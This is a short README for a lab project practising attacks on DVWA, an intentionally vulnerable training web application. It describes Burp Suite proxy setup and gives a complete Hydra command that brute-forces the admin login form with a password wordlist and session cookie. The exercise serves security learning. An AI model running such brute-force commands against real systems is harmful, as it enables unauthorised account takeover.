# DVWA
This project tests on the DVWA website 

## Setup
To setup DVWA, follow the following website:
https://nooblinux.com/how-to-install-dvwa/

## Brute Force Password
### Easy
To run a brute force search on DVWA, burp suite is used. Burp suite is used to intercept the requests that are sent to the DVWA website. 
To setup:
1. Go to Proxy -> Options - Note the IP address and Port
2. Go to Intercept - Make sure that the intercept is on

Within a browser: 
1. Go to Network settings and set proxy address and the port to the noted down IP address and port number.

Run Hydra (a brute force tool):
1. Run the following command: hydra <DVWA Ip address> -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=Low; PHPSESSIONID=eogppved743ckngeo0so6tnp87"
 Command Detaials:
 * -l - Username
 * -P - file that consists of frequently used passwords 
 * -http-get-form - tells hydra to get use a GET request form to submit the details
 * username=^USER^&password=^PASS^ - Places for the custom username and password
 * :F= - Faliure Message
 * :H= - Cookie information
